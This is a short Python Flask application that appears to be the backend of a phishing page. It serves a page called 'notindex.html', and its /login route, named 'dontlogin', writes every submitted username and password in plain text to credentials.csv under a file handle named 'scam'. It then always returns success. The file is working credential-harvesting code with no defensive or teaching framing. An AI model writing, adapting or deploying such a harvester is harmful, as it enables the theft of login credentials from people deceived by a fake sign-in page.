from flask import Flask,render_template,url_for,request,jsonify

import csv

app=Flask(__name__)

@app.route("/")

def index():
    return render_template("notindex.html")

@app.route("/login",methods=["POST"])

def dontlogin():
    username=request.json.get("username")
    password=request.json.get("password")

    with open("credentials.csv", "a+")as scam:
        csv_writer=csv.writer(scam)
        csv_writer.writerow([username,password])
    
    return jsonify({
        "status":"success"
    }),200
app.run()